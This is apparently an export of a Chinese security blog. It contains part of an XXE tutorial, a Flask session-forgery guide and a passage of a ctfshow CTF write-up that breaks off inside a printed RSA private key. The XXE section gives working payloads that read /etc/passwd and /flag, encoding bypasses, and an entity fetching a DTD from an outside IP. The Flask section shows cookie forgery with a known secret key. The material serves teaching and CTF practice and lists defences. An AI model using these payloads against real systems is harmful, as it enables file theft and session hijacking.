class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file://etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;feedback&gt;&amp;xxe;&lt;/feedback&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>然后保存为xml文件：</p><p><img src="/archives/54771cc7/QQ20250302-204043.png"></p><p>再转为<strong>UTF-16BE编码</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> xxe.xml|iconv -f utf-8 -t utf-16be &gt;xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p><code>iconv -f utf-8 -t utf-16be</code>：<code>-f utf-8</code> 指定输入文件的编码格式是 UTF-8。 <code>-t utf-16be</code> 指定输出文件的编码格式是 UTF-16BE（大端字节序）。</p></blockquote><p>发送：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://ip/ -H <span class="string">&quot;Content-Type:application/xml;charset=UTF-16BE&quot;</span> --data-binary @xxe.8-16be.xml</span><br></pre></td></tr></table></figure><blockquote><p>发送一个POST 请求，将 xxe.8-16be.xml 文件的内容以 UTF-16BE 编码格式通过 POST 请求发送到指定的 URL。</p></blockquote><h5 id="双重实体编码（html）绕过"><a href="#双重实体编码（html）绕过" class="headerlink" title="双重实体编码（html）绕过"></a>双重实体编码（html）绕过</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="string">&#x27;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;&#x27;</span></span><br><span class="line">escaped_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&amp;#<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>;&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line"><span class="built_in">print</span>(escaped_str)</span><br><span class="line"></span><br><span class="line">//&amp;<span class="comment">#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#34;&amp;#32;&amp;#62;&quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">//&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br></pre></td></tr></table></figure><p>这样我们转义后就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % a &quot;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt; </span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p>当 XML 解析器遇到 <code>%a;</code> 时，会将其替换为参数实体 <code>a</code> 的值，也就是 <code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &quot;&gt;</code></p></blockquote><h4 id="过滤http"><a href="#过滤http" class="headerlink" title="过滤http"></a>过滤http</h4><p><strong>可以使用其他协议绕过，比如data:&#x2F;&#x2F;协议、file:&#x2F;&#x2F;协议加文件上传、php:&#x2F;&#x2F;filter协议加文件上传</strong></p><p>file:&#x2F;&#x2F;协议加文件上传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter协议加文件上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">    &lt;test&gt;</span><br><span class="line">        &amp;hhh;</span><br><span class="line">    &lt;/test&gt;</span><br><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul><li><p><strong>禁用外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">java:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">python:</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p><strong>过滤和验证用户提交的XML数据</strong></p></li><li><p><strong>不允许XML中含有任何自己声明的DTD ,过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</strong></p></li><li><p><strong>有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 基础漏洞 </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> XXE </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask session伪造</title>
      <link href="/archives/5a88cf7e/"/>
      <url>/archives/5a88cf7e/</url>
      
        <content type="html"><![CDATA[<h2 id="session机制"><a href="#session机制" class="headerlink" title="session机制"></a>session机制</h2><p>由于<strong>HTTP本身是一种无状态的协议</strong>,意味着用户向我们的应用提供了用户名和密码来进行用户认证，认证通过后<strong>HTTP协议不会记录下认证后的状态</strong>，那么下一次请求时，用户还要再一次进行认证，因为根据HTTP协议，我们并不知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在用户首次登录成功后，在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这是传统的基于session认证的过程</p><p><img src="/archives/5a88cf7e/image-20240328144447173.png" alt="image-20240328144447173"></p><h2 id="flask-session存储方式"><a href="#flask-session存储方式" class="headerlink" title="flask session存储方式"></a>flask session存储方式</h2><p>分为两种：</p><ul><li><strong>直接存储在客户端的cookies中，而这样会产生一定的安全问题</strong></li><li><strong>存储在服务端，如：redis,memcached,mysql等等</strong></li></ul><h2 id="flask-session的工作原理"><a href="#flask-session的工作原理" class="headerlink" title="flask session的工作原理"></a>flask session的工作原理</h2><p>会话数据主要通过flask序列化为json并签名后存储在客户端的cookie中，而当用户每次请求时，flask会验证客户端发送的cookie的签名是否与服务器的<code>SECRET_KEY</code>匹配。如果签名无效，则会被丢弃。</p><h2 id="flask的session格式"><a href="#flask的session格式" class="headerlink" title="flask的session格式"></a>flask的session格式</h2><p>flask的session格式一般是由base64加密的session数据（经过了json、zlib压缩处理的字符串）、时间戳、签名组成的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure><p><strong>时间戳</strong>：用来告诉服务端数据最后一次更新的时间，超过31天的会话将会过期，变为无效会话。</p><p><strong>签名</strong>：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>SECRET_KEY</code>加密而成的，用来保证数据没有被修改。</p><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>上面我们说到flask session是利用hmac算法将session数据、时间戳加上<code>SECRET_KEY</code>签名形成的，那么我们要进行session伪造就需要得到密钥<code>SECRET_KEY</code>，如果知道secret_key我们就可以轻松进行session伪造。</p><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a></strong></p><p>工具利用：</p><ul><li><p><strong>kali安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/noraj/flask-session-cookie-manager.git &amp;&amp; <span class="built_in">cd</span> flask-session-cookie-manager</span><br></pre></td></tr></table></figure></li><li><p><strong>解码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27; -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span><br><span class="line"></span><br><span class="line">&#123;u&#x27;username&#x27;: &#x27;admin&#x27;, u&#x27;number&#x27;: &#x27;326410031505&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>-c：session数据</p><p>-s：密钥secret_key</p></blockquote></li><li><p><strong>编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27; -t &#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw</span><br></pre></td></tr></table></figure></li></ul><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul><li><p><strong>保护 SECRET_KEY</strong></p><ul><li><p>避免硬编码在代码中，使用环境变量注入。</p></li><li><p>禁止通过 Git 等版本控制泄露。</p></li><li><p>定期更换密钥，使历史 Session 失效。</p></li></ul></li><li><p><strong>服务端存储</strong></p><p>使用 <code>Flask-Session</code> 扩展将会话数据存储于服务端，避免客户端篡改。</p></li><li><p><strong>HTTPS 传输</strong></p><p>防止 Cookie 在传输过程中被窃取（启用 <code>Secure</code> 和 <code>HttpOnly</code> 属性）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 2025元旦渗透赛复现</title>
      <link href="/archives/16d06f93/"/>
      <url>/archives/16d06f93/</url>
      
        <content type="html"><![CDATA[<h3 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h3><h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>任务应援包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了一张图片，但需要密码</p><p><img src="/archives/16d06f93/QQ20250226-190341.png"></p><p><strong>ARCHPR</strong>爆破：</p><p><img src="/archives/16d06f93/QQ20250226-190643.png"></p><p><code>FLAG1：ctfshow&#123;654321&#125;</code></p><h4 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h4><p>要求我们找到<strong>任务中心的地址</strong></p><p>用winhex打开我们的图片：</p><p><img src="/archives/16d06f93/QQ20250226-191053.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2VjcmV0TWVzc2FnZVJlc3BvbnNlCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgaW1wb3J0IHBpcAogICAgICAgIHBpcC5tYWluKFsnaW5zdGFsbCcsICdzZWNyZXRNZXNzYWdlUmVzcG9uc2UnXSkKICAgICAgICBmcm9tIHNlY3JldE1lc3NhZ2VSZXNwb25zZSBpbXBvcnQgcHJpbnRNZXNzYWdl</span><br></pre></td></tr></table></figure><p>base64解码：</p><p><img src="/archives/16d06f93/QQ20250226-191145.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>这段代码的主要功能是：</p><ul><li>检查 <code>secretMessageResponse</code> 模块是否存在。</li><li>如果不存在，则使用 <code>pip</code> 安装该模块。</li><li>然后从 <code>secretMessageResponse</code> 模块中导入 <code>printMessage</code>。</li></ul><p>kali上运行：</p><p><img src="/archives/16d06f93/QQ20250226-192215.png"></p><p><strong>应援包给的RSA的n、p、q，可以求出d</strong>，求<strong>私钥</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算其他相关参数</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=<span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成私钥</span></span><br><span class="line">key=RSA.construct((n,e,d,p,q))</span><br><span class="line"><span class="comment">#export_key() 将私钥导出为PEM格式字符串，便于存储或传输。</span></span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span 